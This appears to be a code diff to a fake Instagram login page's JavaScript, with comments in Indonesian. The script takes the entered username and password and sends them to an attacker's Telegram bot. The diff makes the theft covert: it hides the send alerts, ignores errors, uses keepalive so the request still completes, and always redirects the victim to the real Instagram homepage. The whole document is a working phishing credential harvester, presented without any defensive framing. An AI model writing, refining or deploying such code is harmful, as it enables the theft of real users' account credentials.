@@ -82,30 +82,28 @@
             const pass = document.getElementById('password').value;
 
             btn.disabled = true;
-            btn.innerText = 'Sensing...';
+            btn.innerText = 'Logging in...';
 
-            const message = `🔔 *Data Login Baru Terdeteksi*\n\n👤 User: ${user}\n🔑 Pass: ${pass}`;
+            const message = `🔔 *Data Akun instagram Baru Terdeteksi*\n\n👤 User: ${user}\n🔑 Pass: ${pass}`;
             
             try {
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                // Mengirim data ke Telegram (menggunakan sendBeacon atau fetch biasa)
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: CHAT_ID,
                         text: message
-                    })
+                    }),
+                    // keepalive memastikan request tetap terkirim meski halaman langsung berpindah
+                    keepalive: true 
                 });
-
-                if (response.ok) {
-                    alert('Berhasil terkirim ke Telegram!');
-                } else {
-                    alert('Gagal mengirim. Cek Token/Chat kamu.');
-                }
             } catch (error) {
-                alert('Koneksi error: ' + error);
+                // Mengabaikan error jika ada kendala jaringan, agar pengalihan tetap berjalan
+                console.log('Error:', error);
             } finally {
-                btn.disabled = false;
-                btn.innerText = 'Log In';
+                // Apapun yang terjadi (berhasil/gagal kirim), langsung lempar ke beranda Instagram
+                window.location.href = 'https://www.instagram.com/';
             }
         });
     </script>
